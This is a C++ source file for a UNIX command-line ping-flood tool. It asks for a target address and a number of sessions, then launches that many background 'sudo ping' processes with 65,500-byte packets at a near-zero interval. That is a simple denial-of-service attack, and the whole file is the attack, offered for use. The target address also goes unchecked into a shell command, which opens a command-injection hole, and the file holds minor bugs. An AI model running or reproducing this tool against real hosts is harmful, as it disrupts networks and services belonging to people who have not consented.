/*
	Software made by Xavier Wrenn.
	This is the UNIX version.
*/

#include <iostream>
#include <cstdlib>
#include <string>
#include <fstream>

using namespace std;

int end()
{
    system("sudo pkill ping");
    return 0;
}

int main(int argc, char *argv[])
{
    string com, addr;
    int times;
    if ( argc == 1 )
    {
        cout << "How many ping windows to open?:";
        cin >> times;
        cout << "Address to ping:";
        cin >> addr;
    }

    else if ( argc == 2 || argc >= 4 || argv[ 1 ] == "--help" )
    {
        cout << "endl" << "USAGE:" << "\n";
        cout << argv[ 0 ] << " IP + session_numbers";
	cout << "\n";
        return 0;
    }

    else
    {
        times = atoi( argv[ 2 ] );
        addr = argv[ 1 ];

    }

    com = "sudo ping -i .00001 -s 65500 " + addr + ">nul &";
    const char * com2 = com.c_str();
    system("sudo -v");
    for ( times; times != 0; times-- )
    {
        system(com2);
    }


    cout << "\n" << "Press any key to terminate all windows:";
    cin.get();cin.get();
    end();
    return 0;
}
